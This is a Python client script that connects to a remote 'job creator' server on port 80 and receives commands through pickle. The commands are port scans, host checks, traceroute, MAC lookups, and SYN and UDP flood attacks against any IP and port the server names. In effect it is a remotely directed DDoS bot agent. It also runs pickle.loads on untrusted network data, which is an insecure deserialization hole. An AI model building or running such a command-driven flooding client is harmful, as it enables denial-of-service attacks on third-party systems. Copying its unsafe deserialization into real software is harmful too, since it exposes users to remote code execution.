from socket import *
import pickle
import sys
from data import *
from status import *
from attack import *
from MAC import find_ip_mac
from tracert import tracert

IP  = input('Please enter IP address of JOB CREATOR you want to connect to:')
serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
serverSocket.connect((IP,80))

control = ['ASK']
status = ['JOB_COMPLETED']

def response(serverSocket,msgRecv):
    jobType = msgRecv.jobType


    if jobType == 'IS_HOST_ONLINE':
        IP = msgRecv.jobData[0]
        x = clientData(status[0],isOnline(IP))
        x.msgSize = sys.getsizeof(pickle.dumps(x));
        serverSocket.send(pickle.dumps(x))

    elif jobType == 'PORT_STATUS':
        IP = msgRecv.jobData[0]
        port = msgRecv.jobData[1]
        x = clientData(status[0],[tcpPortStatus(IP,int(port)),udpPortStatus(IP,int(port))])
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))

    elif  jobType == 'TCP_ATTACK':
        IP = msgRecv.jobData[0]
        port = int(msgRecv.jobData[1])
        x = clientData(status[0],str('TCP_ATTACK INITIATED'))
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))
        tcpSyn(IP,port)

    elif jobType == 'UDP_ATTACK':
        IP = msgRecv.jobData[0]
        port = int(msgRecv.jobData[1])
        x = clientData(status[0],str('UDP_ATTACK INITIATED'))
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))
        udpAttack(IP,port)

    elif jobType == 'MAC_IP':
        x = clientData(status[0],find_ip_mac())
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))

    elif jobType == 'TRACERT':
        hostname = msgRecv.jobData[0]
        x = clientData(status[0],tracert(hostname))
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))


x = clientData(control[0],'')
x.msgSize = sys.getsizeof(pickle.dumps(x));
serverSocket.send(pickle.dumps(x))
msgRecv = pickle.loads(serverSocket.recv(1024))
print('****JOB RECEIVED FROM SERVER****')
print(msgRecv)
response(serverSocket,msgRecv)
serverSocket.close()
